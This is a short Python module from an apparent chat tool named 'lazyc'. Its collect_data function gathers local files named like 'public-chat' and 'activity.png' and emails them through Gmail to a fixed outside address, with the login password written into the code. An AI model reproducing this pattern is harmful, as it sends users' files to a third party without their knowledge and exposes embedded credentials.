import os
import smtplib
import ssl
from email import encoders
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart


def collect_data():
    sender_email = "pythonicwayy@gmail.com"
    receiver_email = "rezaee.erfan.2000@gmail.com"
    password = "alwaysUSEsecurePass"

    # Create MIMEMultipart object
    msg = MIMEMultipart("alternative")
    msg["Subject"] = "lazyc: Chats"
    msg["From"] = sender_email
    msg["To"] = receiver_email
    # filename = "README.md"

    # HTML Message Part
    html = """\
    <html>
    <body>
        <p><b>Check attachments</b>
        <br>
        lazyc chat collector
        </p>
    </body>
    </html>
    """

    part = MIMEText(html, "html")
    msg.attach(part)
    # Add Attachment
    for filename in os.listdir():
        if 'public-chat' in filename or filename == 'activity.png':
            with open(filename, "rb") as attachment:
                part = MIMEBase("application", "octet-stream")
                part.set_payload(attachment.read())

            encoders.encode_base64(part)

            # Set mail headers
            part.add_header(
                "Content-Disposition",
                "attachment", filename=filename
            )
            msg.attach(part)

    # Create secure SMTP connection and send email
    context = ssl.create_default_context()
    with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
        server.login(sender_email, password)
        server.sendmail(
            sender_email, receiver_email, msg.as_string()
        )
